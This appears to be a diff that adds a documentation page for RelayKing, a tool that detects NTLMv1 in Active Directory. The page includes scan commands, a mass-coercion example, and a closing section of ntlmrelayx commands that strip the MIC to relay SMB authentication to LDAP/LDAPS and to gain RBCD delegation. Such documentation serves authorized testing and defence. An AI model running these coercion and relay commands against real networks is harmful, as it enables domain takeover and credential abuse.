@@ -1,0 +1,122 @@
+---
+title: "NTLMv1 detection"
+description: "Detect NTLMv1 authentication support at the domain GPO level or per-host via registry. NTLMv1 enables cross-protocol SMB-to-LDAP relay and offline credential cracking."
+---
+
+NTLMv1 (LAN Manager authentication version 1 and 2) is a significantly weaker authentication protocol than NTLMv2. When a host uses NTLMv1, the captured authentication hash is crackable offline with commodity hardware and — critically — NTLMv1 does not compute a Message Integrity Code (MIC). Without MIC computation, cross-protocol relay attacks (SMB to LDAP/LDAPS) are possible even when those services have signing or channel binding enforced.
+
+## Why NTLMv1 matters for relay
+
+NTLMv2 includes a MIC that binds the `AUTHENTICATE` message to a specific TLS or SMB session, preventing it from being replayed to a different protocol. NTLMv1 does not support MIC. This means:
+
+- Captured NTLMv1 credentials can be relayed from SMB to LDAP or LDAPS using `ntlmrelayx --remove-mic`, bypassing signing and channel binding protections.
+- Cross-protocol relay paths only appear in RelayKing's relay path analysis when NTLMv1 is confirmed (`--ntlmv1` or `--ntlmv1-all` is required).
+
+<Note>
+**`--ntlmv1` is required to detect and display cross-protocol SMB relay paths.** Without it, RelayKing cannot confirm NTLMv1 is in use and will not generate SMB-to-LDAP relay path findings.
+</Note>
+
+## Two detection modes
+
+### --ntlmv1 — Domain-wide GPO check
+
+Queries Active Directory for all LanMan authentication-related GPOs and determines the effective domain-wide `LmCompatibilityLevel` policy. If the policy permits NTLMv1 (level ≤ 2), all hosts in the domain are flagged as potentially using NTLMv1.
+
+| Property | Value |
+|---|---|
+| Requires | Low-privilege AD credentials |
+| What it reads | Domain-level LanMan GPOs via LDAP |
+| Speed | Fast — single LDAP query |
+| Coverage | Domain-wide policy only; per-host overrides are not detected |
+
+```bash
+# Recommended: include --ntlmv1 in every authenticated audit
+python3 relayking.py -u lowpriv -p 'P@ssw0rd' -d corp.local \
+  --dc-ip 10.0.0.1 -vv --audit \
+  --protocols smb,ldap,ldaps,mssql,http,https \
+  --threads 10 -o plaintext,json \
+  --output-file relayking-scan \
+  --proto-portscan --ntlmv1 \
+  --gen-relay-list relaytargets.txt
+```
+
+### --ntlmv1-all — Per-host registry check
+
+Checks the `LmCompatibilityLevel` registry key (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LmCompatibilityLevel`) on **every individual host** that has SMB open. This catches per-host overrides that are more permissive than the domain GPO.
+
+<Warning>
+`--ntlmv1-all` **requires local administrator credentials** on each host. It accesses RemoteRegistry over SMB to read the registry key. If RemoteRegistry is disabled on a host, that host will be skipped and the result will be inconclusive. This check is extremely heavy — it opens a registry connection to every host in the scan. It is not OPSEC-safe.
+</Warning>
+
+| Property | Value |
+|---|---|
+| Requires | Local admin credentials on each scanned host |
+| What it reads | `LmCompatibilityLevel` via RemoteRegistry on each host |
+| Speed | Slow — one registry connection per host |
+| Coverage | Per-host `LmCompatibilityLevel` values including local overrides |
+
+```bash
+# Per-host NTLMv1 check (HEAVY — requires local admin)
+python3 relayking.py -u admin -p 'AdminPass' -d corp.local \
+  --dc-ip 10.0.0.1 -vv --audit \
+  --protocols smb,ldap,ldaps,mssql,http,https \
+  --threads 10 -o plaintext,json \
+  --output-file relayking-scan \
+  --proto-portscan --ntlmv1-all \
+  --gen-relay-list relaytargets.txt
+```
+
+## Relay paths produced
+
+When NTLMv1 is confirmed (domain-wide or per-host), RelayKing generates CRITICAL-severity cross-protocol relay paths for each host where both SMB and LDAP/LDAPS are available:
+
+| Source | Destination | Condition | Severity |
+|---|---|---|---|
+| SMB | LDAP | NTLMv1 enabled, LDAP available | CRITICAL |
+| SMB | LDAPS | NTLMv1 enabled, LDAPS available | CRITICAL |
+| Any | LDAP | NTLMv1 enabled, LDAP signing enforced (bypass via `--remove-mic`) | CRITICAL |
+| Any | LDAPS | NTLMv1 enabled, LDAPS channel binding enforced (bypass via `--remove-mic`) | CRITICAL |
+
+NTLMv1 relay paths are marked with `ntlmv1_required: true` in JSON output.
+
+## Combined with --coerce-all
+
+In environments where NTLMv1 is enabled domain-wide, mass coercion is highly effective — every coerced machine account authentication can be cross-protocol relayed to LDAP regardless of signing configuration:
+
+```bash
+# Mass coercion in an NTLMv1 environment (EXTREMELY NOISY)
+python3 relayking.py -u lowpriv -p 'P@ssw0rd' -d corp.local \
+  --dc-ip 10.0.0.1 \
+  --coerce-all --coerce-target 10.0.0.99 \
+  -o plaintext
+```
+
+<Warning>
+Combining `--coerce-all` with an NTLMv1 environment is extremely impactful and extremely noisy. Every domain computer will attempt to authenticate to your listener. This will generate alerts in virtually all monitored environments.
+</Warning>
+
+## How to exploit NTLMv1 relay paths
+
+Once RelayKing identifies an NTLMv1-enabled host:
+
+```bash
+# Relay SMB auth to LDAP with MIC stripped (NTLMv1 cross-protocol relay)
+ntlmrelayx.py -t ldap://<DC_IP> --remove-mic -smb2support
+```
+
+```bash
+# Relay to LDAPS
+ntlmrelayx.py -t ldaps://<DC_IP> --remove-mic -smb2support
+```
+
+```bash
+# Relay and perform RBCD delegation
+ntlmrelayx.py -t ldap://<DC_IP> --remove-mic --delegate-access -smb2support
+```
+
+## Flag reference
+
+| Flag | Description |
+|---|---|
+| `--ntlmv1` | Pull domain-wide LanMan GPOs (low-priv creds, fast) |
+| `--ntlmv1-all` | Check `LmCompatibilityLevel` registry key on every host (requires local admin, slow, heavy) |
